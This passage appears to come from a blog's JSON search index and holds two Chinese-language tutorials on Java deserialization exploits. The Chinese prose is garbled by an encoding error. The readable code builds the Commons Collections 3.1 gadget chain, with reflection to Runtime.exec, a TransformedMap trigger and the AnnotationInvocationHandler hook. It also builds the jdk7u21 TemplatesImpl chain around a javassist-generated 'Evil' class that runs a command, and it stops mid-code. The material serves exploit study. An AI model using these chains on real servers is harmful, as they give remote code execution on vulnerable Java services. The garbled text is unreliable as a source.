æ˜¯å‰é¢æåˆ°çš„åå°„æœºåˆ¶ï¼ŒRuntime.classè¿”å›java.lang.classï¼Œè¿™é‡Œæˆ‘ä»¬å¿…é¡»æŠŠRuntime.classæ¢æˆRuntimeå®ä¾‹.classæ‰èƒ½æŒ‰é¢„æƒ³ä¸­çš„æ‰§è¡Œï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨å°±åœ¨æƒ³åŠæ³•å¾—åˆ°Runtimeå®ä¾‹ï¼Œè¿™æ ·å°±å˜æˆä¸€ä¸ªæ­»å¾ªç¯äº†ã€‚è¿™ä¸ªæ–¹æ³•ä¹Ÿä¸è¡Œ åå°„å¥—å¨ƒgetRuntimeæ–¹æ³•ä¼šè¿”å›Runtimeå®ä¾‹ï¼Œåªè¦è·å–åˆ°äº†getRuntimeæ–¹æ³•å†invokeæ‰§è¡Œå°±ç­‰äºè·å–åˆ°äº†Runtimeå®ä¾‹ã€‚æ—¢ç„¶æ— æ³•ç›´æ¥è·å–Runtimeå®ä¾‹ï¼Œé‚£å¯ä»¥å»å°è¯•è·å–getRuntimeæ–¹æ³•ã€‚ æ³¨æ„ï¼šå¼€å§‹ä¼ å…¥çš„æ˜¯java.lang.classç±»ï¼ˆRuntime.classï¼‰ æ­¥éª¤ 12345671. é€šè¿‡åå°„æœºåˆ¶è·å–åå°„æœºåˆ¶ä¸­çš„getMethodç±»ï¼Œç”±äºgetMethodç±»æ˜¯å­˜åœ¨Classç±»ä¸­ï¼Œå°±ç¬¦åˆå¼€å¤´Classç±»çš„é™åˆ¶2. é€šè¿‡getMethodå‡½æ•°è·å–Runtimeç±»ä¸­çš„getRuntimeå‡½æ•°ã€‚åœ¨å“ªä¸ªç±»ä¸­è°ƒç”¨getMethodå»è·å–æ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯ç”±invokeå‡½æ•°é‡Œé¢çš„çš„ç¬¬ä¸€ä¸ªå‚æ•°objå†³å®šçš„3. å†é€šè¿‡åå°„æœºåˆ¶è·å–åå°„æœºåˆ¶ä¸­çš„invokeç±»ï¼Œæ‰§è¡Œä¸Šé¢è·å–çš„getRuntimeå‡½æ•°4. invokeè°ƒç”¨getRuntimeå‡½æ•°ï¼Œè·å–Runtimeç±»çš„å®ä¾‹ã€‚é‡Œåœ¨ä½¿ç”¨åå°„æœºåˆ¶è°ƒç”¨getRuntimeé™æ€ç±»æ—¶ï¼Œinvokeé‡Œé¢ç¬¬ä¸€ä¸ªå‚æ•°objå…¶å®å¯ä»¥ä»»æ„æ”¹ä¸ºnullï¼Œæˆ–è€…å…¶ä»–ç±»ï¼Œè€Œä¸ä¸€å®šè¦æ˜¯Runtimeç±» å…³äºåå°„ 123456ç±».getMethod(è¦è·å–çš„æ–¹æ³•å,è¦è·å–æ–¹æ³•çš„å‚æ•°ç±»å‹) è·å¾—æ–¹æ³•å¯¹è±¡æ–¹æ³•å¯¹è±¡.invoke(ç›¸å…³ç±»å®ä¾‹/ç›¸å…³ç±»,å‚æ•°) æ‰§è¡Œæ–¹æ³•invokeçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ‰§è¡Œmethodçš„å¯¹è±¡objï¼š å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡ å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±» æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹åˆ©ç”¨åå°„æœºåˆ¶è¿›è¡Œåå°„è°ƒç”¨çš„è¿‡ç¨‹ ç¬¬ä¸€æ¬¡å¾ªç¯ç›´æ¥è¿”å›äº†Runtime.class 1input1=Runtime.class ç¬¬äºŒæ¬¡ å®é™…æ‰§è¡Œçš„ä»£ç  1234//ç¬¬äºŒæ¬¡å¾ªç¯ Class cls2=input1.getClass(); //cls2:java.lang.classç±» Method method2=cls2.getMethod(&quot;getMethod&quot;, String.class, Class[].class);//method2:é€šè¿‡åå°„è·å–åˆ°çš„getMethodå¯¹è±¡ Object input2=method2.invoke(input1,new Object[] {&quot;getRuntime&quot;, new Class[]{} });//input2:getRuntimeå¯¹è±¡ ç¬¬ä¸‰æ¬¡å¾ªç¯ï¼Œæœ€é‡è¦çš„ä¸€æ­¥ï¼Œå…ˆç”¨åå°„è·å–invokeæ–¹æ³•å¯¹è±¡ï¼Œç„¶ååˆ©ç”¨invokeæ–¹æ³•å¯¹è±¡.invokeæ‰§è¡Œä¼ å…¥getRuntimeæ–¹æ³•å¯¹è±¡ï¼Œå¾—åˆ°Runtimeå®ä¾‹ 123456//ç¬¬ä¸‰æ¬¡å¾ªç¯ï¼Œinputæ˜¯é€šè¿‡åå°„è·å–åˆ°çš„getRuntimeå¯¹è±¡ Class cls3=input2.getClass();//java.lang.reflec.Methodç±» Method method3=cls3.getMethod(&quot;invoke&quot;, new Class[] {Object.class, Object[].class });//method3:invokeæ–¹æ³•å¯¹è±¡.ç¬¬äºŒä¸ªå‚æ•°ä¸ºinvokeçš„å‚æ•°ç±»å‹ //invokeæ–¹æ³•å¯¹è±¡.invoke(input, this.iArgs)å®é™…ä¸Šç­‰äºinput.invoke(this.iArgs) Object input3=method3.invoke(input2,new Object[] {null, new Object[]{} }); //input3:Runtimeå®ä¾‹ ç¬¬å››æ¬¡å¾ªç¯ 1234//ç¬¬å››æ¬¡å¾ªç¯ï¼Œå·²ç»è·å–åˆ°äº†Runtimeå®ä¾‹ Class cls4=input3.getClass(); //cls4:java.lang.Runtimeç±» Method method4=cls4.getMethod(&quot;exec&quot;,new Class[] {String.class });//method4:execæ–¹æ³•å¯¹è±¡ method4.invoke(input3,new Object[] {&quot;calc.exe&quot;});//execæ–¹æ³•å¯¹è±¡.invoke(Runtimeå®ä¾‹,å‚æ•°) ç®€åŒ–æµç¨‹ 1234567891011121314151617181920212223242526272829import java.lang.reflect.Method;public class Commons_collections_Test { public static void main(String[] args) throws Exception { //ç¬¬ä¸€æ¬¡å¾ªç¯,è¿”å›äº†Runtie.class Class input1=Runtime.class; //ç¬¬äºŒæ¬¡å¾ªç¯ Class cls2=input1.getClass(); //cls2:java.lang.classç±» Method method2=cls2.getMethod(&quot;getMethod&quot;, String.class, Class[].class);//method2:é€šè¿‡åå°„è·å–åˆ°çš„getMethodå¯¹è±¡ Object input2=method2.invoke(input1,new Object[] {&quot;getRuntime&quot;, new Class[]{} });//input2:getRuntimeå¯¹è±¡ //ç¬¬ä¸‰æ¬¡å¾ªç¯ï¼Œinputæ˜¯é€šè¿‡åå°„è·å–åˆ°çš„getRuntimeå¯¹è±¡ Class cls3=input2.getClass();//java.lang.reflec.Methodç±» Method method3=cls3.getMethod(&quot;invoke&quot;, new Class[] {Object.class, Object[].class });//method3:invokeæ–¹æ³•å¯¹è±¡.ç¬¬äºŒä¸ªå‚æ•°ä¸ºinvokeçš„å‚æ•°ç±»å‹ //invokeæ–¹æ³•å¯¹è±¡.invoke(input, this.iArgs)å®é™…ä¸Šç­‰äºinput.invoke(this.iArgs) Object input3=method3.invoke(input2,new Object[] {null, new Object[]{} }); //input3:Runtimeå®ä¾‹ //ç¬¬å››æ¬¡å¾ªç¯ï¼Œå·²ç»è·å–åˆ°äº†Runtimeå®ä¾‹ Class cls4=input3.getClass(); //cls4:java.lang.Runtimeç±» Method method4=cls4.getMethod(&quot;exec&quot;,new Class[] {String.class });//method4:execæ–¹æ³•å¯¹è±¡ method4.invoke(input3,new Object[] {&quot;calc.exe&quot;});//execæ–¹æ³•å¯¹è±¡.invoke(Runtimeå®ä¾‹,å‚æ•°) }} ååºåˆ—åŒ–è§¦å‘ç‚¹åˆ°ç›®å‰ä¸ºæ­¢æˆ‘ä»¬å·²ç»æ„é€ å¥½äº†åå°„åˆ©ç”¨é“¾ï¼Œç°åœ¨æ¥çœ‹ä¸€ä¸‹å¦‚ä½•è§¦å‘ï¼Œè§¦å‘éœ€è¦ä¸¤ä¸ªæ¡ä»¶ 121.æœåŠ¡å™¨è°ƒç”¨readObjectååºåˆ—åŒ–æ„é€ å¥½çš„ChainedChainedTransformer2.è°ƒç”¨ååºåˆ—åŒ–åçš„ChainedTransformerç±»ä¸­çš„transformæ–¹æ³•æ‰§è¡Œå‘½ä»¤ ä»£ç å¦‚ä¸‹ï¼Œå®é™…ç¯å¢ƒä¸­åŸºæœ¬ä¸å¯èƒ½æ»¡è¶³è¿™ä¸¤ä¸ªæ¡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯»æ‰¾å…¶ä»–è§¦å‘æ–¹å¼ 123456789101112131415161718192021222324252627282930313233343536373839import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;public class Commons_collections_Test { public static void main(String[] args) throws Exception { Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), //æ ¹æ®transformçš„æ‰§è¡Œè§„åˆ™ï¼ŒInvokeTransformerç±»æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æ‰§è¡Œçš„ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªClass[]ï¼ŒåŒ…å«äº†è¦è·å–æ–¹æ³•çš„å‚æ•°ç±»å‹ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºinvokeçš„ç¬¬äºŒä¸ªå‚æ•° new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[]{}}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}) }; //æŠŠæ„é€ å¥½çš„æ•°ç»„å°è£…æˆChainedTransformer ChainedChainedTransformer chainedTransformer=new ChainedTransformer(transformers); //åºåˆ—åŒ–æ•°æ® FileOutputStream fileOutputStream=new FileOutputStream(&quot;payload.bin&quot;); ObjectOutputStream objectOutputStream=new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(chainedTransformer); //ååºåˆ—åŒ–æ•°æ® FileInputStream fileInputStream=new FileInputStream(&quot;payload.bin&quot;); ObjectInputStream objectInputStream=new ObjectInputStream(fileInputStream); //è°ƒç”¨ååºåˆ—åŒ–åçš„ChainedTransformerç±»ä¸­çš„transformæ–¹æ³•è§¦å‘ ChainedTransformer SerialChainTransformer=(ChainedTransformer)objectInputStream.readObject(); SerialChainTransformer.transform(null); }} ç»‘å®šMapå’Œè½¬æ¢é“¾ä¹‹å‰æˆ‘ä»¬æŠŠæ„é€ å¥½çš„Transformeræ•°ç»„å°è£…æˆäº†ä¸€ä¸ªChainedTransformerï¼Œå®ƒå®è´¨ä¸Šæ˜¯ä¸€ä¸ªè½¬æ¢é“¾ï¼Œè€ŒTransformerMapç±»çš„æ„é€ å‡½æ•°å¯ä»¥ç»‘å®šmapå’Œè½¬æ¢é“¾ï¼Œåªè¦åœ¨mapä¸­æ·»åŠ æ•°æ®å°±ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªè½¬æ¢é“¾ï¼Œæ‰§è¡Œpayloadï¼Œè¿™æ ·é™ä½äº†è§¦å‘çš„éš¾åº¦ org.apache.commons.collections.map.TransformedMap TransformedMapç±»çš„åŠŸèƒ½æ˜¯å­˜å‚¨é”®å€¼å¯¹å¹¶å°†å…¶è½¬æ¢ä¸ºtransform objectsï¼Œdecorateæ–¹æ³•å¯åˆ›å»ºé”®å€¼å¯¹ç»„ï¼Œç”¨äºç»‘å®šmapå’Œè½¬æ¢é“¾ ä»£ç å®ä¾‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.util.HashMap;import java.util.Map;public class Commons_collections_Test { public static void main(String[] args) throws Exception { Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), //æ ¹æ®transformçš„æ‰§è¡Œè§„åˆ™ï¼ŒInvokeTransformerç±»æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æ‰§è¡Œçš„ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªClass[]ï¼ŒåŒ…å«äº†è¦è·å–æ–¹æ³•çš„å‚æ•°ç±»å‹ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºinvokeçš„ç¬¬äºŒä¸ªå‚æ•° new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[]{}}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}) }; //æŠŠæ„é€ å¥½çš„æ•°ç»„å°è£…æˆChainedTransformer ChainedTransformer chainedTransformer=new ChainedTransformer(transformers); Map innerMap=new HashMap(); innerMap.put(&quot;value&quot;,&quot;value&quot;); Map map=TransformedMap.decorate(innerMap,null,chainedTransformer); //åºåˆ—åŒ–map FileOutputStream fileOutputStream=new FileOutputStream(&quot;payload.bin&quot;); ObjectOutputStream objectOutputStream=new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(map); FileInputStream fileInputStream=new FileInputStream(&quot;payload.bin&quot;); ObjectInputStream objectInputStream=new ObjectInputStream(fileInputStream); //ååºåˆ—åŒ– Map UnserializedMap=(Map)objectInputStream.readObject(); //åªè¦ä¿®æ”¹Mapçš„å€¼å°±ä¼šè§¦å‘è½¬æ¢é“¾ï¼Œæ‰§è¡Œpayload //å‘Mapä¸­æ·»åŠ æ–°å€¼ //UnserializedMap.put(&quot;123&quot;,&quot;123&quot;); //ä¿®æ”¹é”®å€¼ Map.Entry entry = (Map.Entry) UnserializedMap.entrySet().iterator().next(); entry.setValue(&quot;foobar&quot;); }} ç°åœ¨è§¦å‘æ¡ä»¶å˜æˆäº†ç»è¿‡è¿­ä»£å™¨è¿­ä»£è°ƒç”¨setValueå‡½æ•°ä¿®æ”¹Mapå€¼æ¥è§¦å‘æ¼æ´ï¼Œç»§ç»­å¯»æ‰¾è°ƒç”¨äº†setValueçš„åœ°æ–¹ AnnotationInvocationHandlerçš„readObjectå¤å†™ç‚¹jdk1.7ä¸­æœ‰ä¸€ä¸ªå­˜åœ¨readobjectå¤å†™ç‚¹çš„ç±»sun.reflect.annotation.AnnotationInvocationHandlerã€‚javaåœ¨ååºåˆ—åŒ–ä¸­ä¼šä¼˜å…ˆè°ƒç”¨å¤å†™çš„readObject AnnotationInvocationHandleræ„é€ å‡½æ•° å­˜åœ¨setValueï¼Œè§¦å‘æ¼æ´ 1234567891011121314151617181920212223242526private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { return; } Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) { Entry var5 = (Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6))); //å­˜åœ¨setValue } } } }","link":"/2021/04/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CommonsCollections3-1/"},{"title":"jdk7u21ååºåˆ—åŒ–","text":"åŸç†ç”±javassistè´Ÿè´£æ„å»ºä¸€ä¸ªæ¶æ„ç±»å¹¶å¾—åˆ°å­—èŠ‚ç ï¼Œç„¶åå‘TemplatesImplçš„_bytecodeså±æ€§èµ‹å€¼æ¶æ„ç±»çš„å­—èŠ‚ç ï¼Œå­—èŠ‚ç æ•°ç»„åœ¨è¢«defineTransletClasses()ä¸­è¢«å®ä¾‹åŒ–æˆæ¶æ„ç±»ï¼Œè°ƒç”¨æ„é€ å‡½æ•°ä¸­çš„å‘½ä»¤è§¦å‘RCEï¼Œéœ€è¦è°ƒç”¨getOutputProperties()è§¦å‘ 12345æ¶æ„ç±»çš„çˆ¶ç±»å¿…é¡»ä¸ºABSTRACT_TRANSLET TemplatesImplç±»çš„_bytecodesä¸ä¸ºnullï¼Œä¸ºæ¶æ„ç±»å­—èŠ‚ç TemplatesImplç±»çš„_nameä¸ä¸ºnullTemplatesImplç±»çš„_class=null_tfactoryéœ€è¦æ˜¯ä¸€ä¸ªæ‹¥æœ‰getExternalExtensionsMap()æ–¹æ³•çš„ç±»ï¼Œå³TransformerFactoryImpl()ï¼Œä»¥æ­¤æ¥å…¼å®¹ä¸åŒç‰ˆæœ¬ defindTransletClasses()æ‰§è¡Œå®Œåï¼Œ_class[_transletIndex]å°±å·²ç»æ˜¯æ¶æ„ç±»ï¼Œæ¥ä¸‹æ¥æ‰§è¡ŒnewInstance()å®ä¾‹åŒ–æ¶æ„ç±»ï¼Œä»è€Œæ‰§è¡Œæ„é€ æ–¹æ³•ä¸­çš„payload defineTransletClasses()ä¸­æ¶æ„ç±»çš„æ„é€ ï¼ŒæŠŠæ¶æ„ç±»çš„å­—èŠ‚ç è½¬æ¢ä¸ºç±»çš„å®ä¾‹ç±» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950private void defineTransletClasses() throws TransformerConfigurationException { //_bytecodesä¸èƒ½ä¸ºnull if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader()); } }); //è·å–_bytecodesçš„é•¿åº¦ï¼Œåˆ›å»º_classæ•°ç»„ï¼Œè¿™é‡Œéœ€è¦è®©æ¶æ„ç±»çš„å­—èŠ‚ç ä¸ºä¸€ä¸ªäºŒç»´å­—èŠ‚æ•°ç»„ try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) { _auxClasses = new Hashtable(); } for (int i = 0; i &lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // æ¶æ„ç±»çš„çˆ¶ç±»å¿…é¡»æ˜¯ABSTRACT_TRANSLET if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex &lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } catch (ClassFormatError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (LinkageError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } æ„é€ payload1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import java.lang.reflect.Field;public class Myjdk7u21 { //å°è£…setFieldValue()æ–¹æ³•ï¼Œä¾¿äºç»™ç±»å­—æ®µèµ‹å€¼ private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { Field field=obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { //ClassPoolå¯¹è±¡æ˜¯ä¸€ä¸ªè¡¨ç¤ºclassæ–‡ä»¶çš„CtClasså¯¹è±¡çš„å®¹å™¨ ClassPool pool =ClassPool.getDefault(); //åˆ›å»ºæ¶æ„ç±»Evil CtClass cc=pool.makeClass(&quot;Evil&quot;); //è®¾ç½®æ¶æ„ç±»çˆ¶ç±»ä¸ºAbstractTranslet cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //åˆ›å»ºæ¶æ„ç±»çš„æ„é€ å‡½æ•°ï¼Œå†™å…¥payload CtConstructor cons=new CtConstructor(new CtClass[]{},cc); cons.setBody(&quot;{ Runtime.getRuntime().exec(\\&quot;calc\\&quot;);}&quot;); cc.addConstructor(cons); //å°†Evilç±»è½¬æ¢æˆbyteæ•°ç»„ byte[] TempByteCode=cc.toBytecode(); byte[][] ByteCode=new byte[][]{TempByteCode}; //å®ä¾‹åŒ–TemplatesImplç±» TemplatesImpl templates=TemplatesImpl.class.newInstance(); //ä¸ºTemplatesImplç±»çš„å„ä¸ªå­—æ®µèµ‹å€¼ setFieldValue(templates,&quot;_bytecodes&quot;,ByteCode); setFieldValue(templates,&quot;_class&quot;,null); setFieldValue(templates,&quot;_name&quot;,&quot;x&quot;); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); templates.getOutputProperties(); }} åŠ¨æ€ä»£ç†å½“æ²¡æœ‰æ²¡æœ‰è§¦å‘getOutputProperties()çš„ç‚¹ï¼Œå°±éœ€è¦ä½¿ç”¨åŠ¨æ€ä»£ç†ï¼Œä»£ç†æ˜¯ä¸ºäº†åœ¨ä¸æ”¹å˜ç›®æ ‡å¯¹è±¡æ–¹æ³•çš„æƒ…å†µä¸‹å¯¹æ–¹æ³•è¿›è¡Œå¢å¼º åŠ¨æ€ä»£ç†æ˜¯javaçš„ç‰¹æ€§ä¹‹ä¸€ï¼Œå…¶å®å°±å¯ä»¥ç†è§£ä¸ºwebåº”ç”¨ä¸­çš„æ‹¦æˆªå™¨ï¼Œåœ¨æ‰§è¡Œæ­£å¼ä»£ç ä¹‹å‰å…ˆè¿‡ä¸€ä¸ªæ‹¦æˆªå™¨å‡½æ•°ï¼ˆæ¯”å¦‚springçš„AOPï¼‰ã€‚ä½†æ˜¯ä»¥ä¸Šç±»æ¯”åªæ˜¯ä¸ºäº†ä¾¿äºç†è§£ï¼Œå®é™…ä¸Šspringçš„AOPä¹‹ç±»çš„æ‹¦æˆªå™¨åè€Œæ˜¯åŸºäºjavaçš„åŠ¨æ€ä»£ç†å®ç°çš„ã€‚ ä¾‹å­ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;// éœ€è¦å®ç°çš„æ¥å£ï¼ˆæ‹¦æˆªåŠ¨ä½œæ˜¯åŸºäºæ¥å£çš„ï¼Œæ‰€ä»¥éœ€è¦è®¾å®šæ¥å£ï¼‰interface ISubject { public void hello(String str);}// å®é™…çš„éœ€è¦è¢«ä»£ç†çš„å¯¹è±¡class SubjectImpl implements ISubject { public void hello(String str) { System.out.println(&quot;SubjectImpl.hello(): &quot; + str); }}// Handlerå¯¹è±¡ï¼ˆç»§æ‰¿InvocationHandlerçš„æ‹¦æˆªå™¨ï¼‰//InvocationHandleræ˜¯ä¸€ä¸ªç”¨äºè·ŸProxyç±»å¯¹æ¥çš„æ¥å£class Handler implements InvocationHandler { private Object subject; //æ„é€ å‡½æ•°ï¼Œä¼ å…¥è¢«ä»£ç†å®ç°ç±»çš„å®ä¾‹ public Handler(Object subject) { this.subject = subject; }//æ‰€æœ‰è¢«Proxyæ‹¦æˆªçš„å‡½æ•°éƒ½ä¼šç»è¿‡è¿™ä¸ªæ¥å£çš„invokeå‡½æ•° public Object invoke(Object object, Method method, Object[] args) throws Throwable { System.out.println(&quot;before!&quot;); //å®Œæˆæ‹¦æˆªæ“ä½œä¹‹åå»è°ƒç”¨è¢«ä»£ç†å®ç°ç±»ï¼Œåå°„æœºåˆ¶ï¼Œä¼ å…¥å®ä¾‹ï¼Œå‚æ•° method.invoke(this.subject, args); System.out.println(&quot;after!&quot;); return null; }}public class DynamicProxy { public static void main(String[] args) { //è¢«ä»£ç†ç±» SubjectImpl subject = new SubjectImpl(); //æ‹¦æˆªå™¨å®ç°ç±»ï¼Œé€šè¿‡æ„é€ å‡½æ•°ä¼ å…¥è¢«ä»£ç†ç±»çš„å®ä¾‹ InvocationHandler tempHandler = new Handler(subject);// ä½¿ç”¨Proxy.newProxyInstanceåˆ›å»ºä»£ç† ISubject iSubject = (ISubject) Proxy.newProxyInstance(DynamicProxy.class.getClassLoader(), new Class&lt;?&gt;[] {ISubject.class}, tempHandler); iSubject.hello(&quot;world!&quot;); }} Proxy.newProxyInstanceä¸‰ä¸ªä¼ å…¥å‚æ•°ï¼š 123loaderï¼Œé€‰ç”¨çš„ç±»åŠ è½½å™¨ã€‚interfacesï¼Œè¢«ä»£ç†ç±»æ‰€å®ç°çš„æ¥å£ï¼Œè¿™ä¸ªæ¥å£å¯ä»¥æ˜¯å¤šä¸ªã€‚å³éœ€è¦æ‹¦æˆªçš„æ¥å£handlerï¼Œä¸€ä¸ª å®ç°æ‹¦æˆªå™¨çš„invocation handlerã€‚ è®¾ç½®åŠ¨æ€ä»£ç†åï¼Œåªè¦è°ƒç”¨äº†è¿”å›å¯¹è±¡ä¸­è¢«å®‰æ’ä»£ç†çš„æ¥å£ï¼Œå°±ä¼šè¿›å…¥invocationHandlerçš„invokeå‡½æ•°ã€‚ å»¶é•¿åˆ©ç”¨é“¾ï¼šAnnotationInvocationHandlerAnnotationInvocationHandleræ˜¯ä¸€ä¸ªInvocationHandlerçš„å®ç°ç±» sun.reflect.annotation.AnnotationInvocationHandler#AnnotationInvocationHandler å…ˆçœ‹ä¸€ä¸‹AnnotationInvocationHandlerçš„æ„é€ å‡½æ•° åœ¨payloadæ„é€ ä¸­ä¼ å…¥å‚æ•° 1InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map); è¿™æ · 12this.type=Templates.classthis.membervalues=map è¿™é‡Œçš„AnnotationInvocationHandleræ„é€ å‡½æ•°æ˜¯ç¼ºçœä¿®é¥°ç¬¦ï¼Œåœ¨ä¸åŒçš„åŒ…ä¸­æ˜¯ä¸èƒ½ç›´æ¥è°ƒç”¨ åå°„æœºåˆ¶ä¸­æåˆ°ï¼Œå¯ä»¥ä½¿ç”¨setAccessible(true)æ¥å¼€æ”¾æƒé™ã€‚ exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.*;import javassist.*;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.*;import java.util.*;public class Myjdk7u21 { //åºåˆ—åŒ– public static byte[] serialize(final Object obj) throws Exception { ByteArrayOutputStream btout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); } //ååºåˆ—åŒ– public static Object unserialize(final byte[] serialized) throws Exception { ByteArrayInputStream btin = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(btin); return objIn.readObject(); } //é€šè¿‡åå°„ä¸ºobjçš„å±æ€§èµ‹å€¼ private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { Field field=obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } //å°è£…äº†ä¹‹å‰å¯¹æ¶æ„TemplatesImplç±»çš„æ„é€  private static TemplatesImpl getEvilTemplatesImpl() throws Exception{ ClassPool pool = ClassPool.getDefault();//ClassPoolå¯¹è±¡æ˜¯ä¸€ä¸ªè¡¨ç¤ºclassæ–‡ä»¶çš„CtClasså¯¹è±¡çš„å®¹å™¨ CtClass cc = pool.makeClass(&quot;Evil&quot;);//åˆ›å»ºEvilç±» cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//è®¾ç½®Evilç±»çš„çˆ¶ç±»ä¸ºAbstractTranslet CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);//åˆ›å»ºæ— å‚æ„é€ å‡½æ•° cons.setBody(&quot;{ Runtime.getRuntime().exec(\\&quot;calc\\&quot;); }&quot;);//è®¾ç½®æ— å‚æ„é€ å‡½æ•°ä½“ cc.addConstructor(cons); byte[] byteCode=cc.toBytecode();//toBytecodeå¾—åˆ°Evilç±»çš„å­—èŠ‚ç  byte[][] targetByteCode = new byte[][]{byteCode}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates,&quot;_bytecodes&quot;,targetByteCode); setFieldValue(templates,&quot;_class&quot;,null); setFieldValue(templates,&quot;_name&quot;,&quot;xx&quot;); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); return templates; } public static void main(String[] args) throws Exception { TemplatesImpl templates=getEvilTemplatesImpl(); HashMap map = new HashMap(); 